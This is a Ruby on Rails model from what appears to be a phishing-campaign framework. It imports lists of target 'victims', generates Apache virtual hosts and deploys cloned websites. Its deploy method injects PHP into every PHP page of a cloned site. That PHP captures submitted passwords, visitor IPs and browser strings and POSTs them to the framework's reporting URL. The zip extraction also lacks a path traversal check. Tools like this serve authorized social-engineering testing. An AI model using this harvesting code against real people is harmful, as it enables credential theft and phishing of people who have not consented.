require 'fileutils'
require 'zip'

class Campaign < ActiveRecord::Base
  # relationships
  belongs_to :template
  has_one :campaign_settings, dependent: :destroy
  has_one :email_settings, dependent: :destroy
  has_many :statistics
  has_many :victims
  has_many :smtp_communications
  has_many :blasts

  # allow mass asignment
  attr_accessible :name, :description, :active, :emails, :scope, :template_id, :test_email

  # named scopes
  scope :active, where(:active => true)
  scope :launched, where(:email_sent => true)

  before_save :parse_email_addresses
  after_save :check_changes
  after_update :devops, :if => :active_changed?

  # validate form before saving
  validates :name, :presence => true,
            :length => {:maximum => 255}
  validates :description,
            :length => {:maximum => 255}
  validates :emails,
            :length => {:maximum => 60000}
  validates :scope, :numericality => {:greater_than_or_equal_to => 0},
            :length => {:maximum => 4}, :allow_nil => true

  def get_binding
    @campaign_id = id
    @fqdn = campaign_settings.fqdn
    @template_location = deployment_directory
    @approot = Rails.root
    @directory_index = template.index_file
    binding
  end

  def test_victim
    v = Victim.new
    v.email_address = test_email
    v
  end

  private

  def parse_email_addresses
    if not self.emails.blank?
      entry = self.emails.split("\r\n")[0]
      if entry.scan(/,/).count == 0
        # email
        parse_single_csv
      elsif entry.scan(/,/).count == 1
        # firstname, email
        parse_double_csv
      elsif entry.scan(/,/).count == 2
        # firstname, lastname, email
        parse_triple_csv
      end
      
      # clear the Campaigns.emails holder
      self.update_attribute(:emails, " ")
    end
  end

  def parse_single_csv
    victims = self.emails.split("\r\n")
    victims.each do |v|
      victim = Victim.new
      victim.campaign_id = self.id
      victim.firstname = ""
      victim.lastname = ""
      victim.email_address = v
      victim.save
    end
  end

  def parse_double_csv
    victims = self.emails.split("\r\n")
    victims.each do |v|
      firstname = v.split(",")[0].strip
      email = v.split(",")[1].strip
      victim = Victim.new
      victim.campaign_id = self.id
      victim.firstname = firstname
      victim.email_address = email
      victim.save
    end
  end

  def parse_triple_csv
    victims = self.emails.split("\r\n")
    victims.each do |v|
      firstname = v.split(",")[0].strip
      lastname = v.split(",")[1].strip
      email = v.split(",")[2].strip
      victim = Victim.new
      victim.campaign_id = self.id
      victim.firstname = firstname
      victim.lastname = lastname
      victim.email_address = email
      victim.save
    end
  end

  def check_changes
    Rails.logger.info "!!!!CHECKING CHANGES!!!!"
    if campaign_settings == nil
      return false
    end

    if self.changed?
      Rails.logger.info "!!!!CHANGED!!!!"
      httpd = GlobalSettings.first.path_apache_httpd

      # gather active campaigns
      active_campaigns = Campaign.active

      # flush httpd config
      File.open(httpd, 'w') { |file| file.truncate(0) }

      # write each active campaign to httpd
      active_campaigns.each do |campaign|
        File.open(httpd, "a+") do |f|
          template = Template.find_by_id(campaign.template_id)
          if template.nil?
            raise 'Template #{campaign.template_id} not found'
          else
            f.write(vhost_text(campaign))
          end
        end
      end

      # reload apache
      restart_apache = GlobalSettings.first.command_apache_restart
      Rails.logger.info system(restart_apache)
    end
  end

  def vhost_text(campaign)
    template = ERB.new File.read(File.join(Rails.root, "app/views/campaigns/virtual_host.txt.erb",))
    template.result(campaign.get_binding)
  end

  def devops
    active ? deploy : undeploy
  end

  def undeploy
    FileUtils.rm_rf deployment_directory
  end

  def deploy
    FileUtils.mkdir_p(deployment_directory)
    template.website_files.each do |page|
      loc = File.join(deployment_directory, page[:file])
      #FileUtils.cp(page.file.current_path, loc)
      File.open(loc, 'w') do |fo|
        if File.extname(page.file.current_path) == '.php'
          fo.puts "
                  <?php
                  $password = $_POST['FormFieldName'];
                  if ($password != "") {
                    $password = 'password:' . $password; 
                  }

                  $uid = $_GET['uid'];
                  $ip = $_SERVER['REMOTE_ADDR'];
                  $browser = $_SERVER['HTTP_USER_AGENT'];
                  $host = $_SERVER['HTTP_HOST'];
                  $url = '#{PhishingFramework::SITE_URL}' . '/reports/results/'; 
                  $data = array('uid' => $uid, 'browser_info' => $browser, 'ip_address' => $ip, 'extra' => $password);

                  // use key 'http' even if you send the request to https://...
                  $options = array(
                          'http' => array(
                          'header'  => \"Content-type: application/x-www-form-urlencoded\",
                          'method'  => 'POST',
                          'content' => http_build_query($data),
                          ),
                  );
                  $context  = stream_context_create($options);
                  $result = file_get_contents($url, false, $context); 
                  ?>
                  "
        end
        File.foreach(page.file.current_path) do |li|
          fo.puts li
        end
      end
      if inflatable?(loc)
        inflate(loc, deployment_directory)
      end
    end
  end

  def deployment_directory
    File.join(Rails.root, "public/deployed/campaigns", id.to_s)
  end

  def inflatable?(file)
    File.extname(file) == '.zip'
  end

  def inflate(file, destination)
    Zip::File.open(file) { |zip_file|
      zip_file.each { |f|
        f_path=File.join(destination, f.name)
        FileUtils.mkdir_p(File.dirname(f_path))
        zip_file.extract(f, f_path) unless File.exist?(f_path)
      }
    }
  end
end
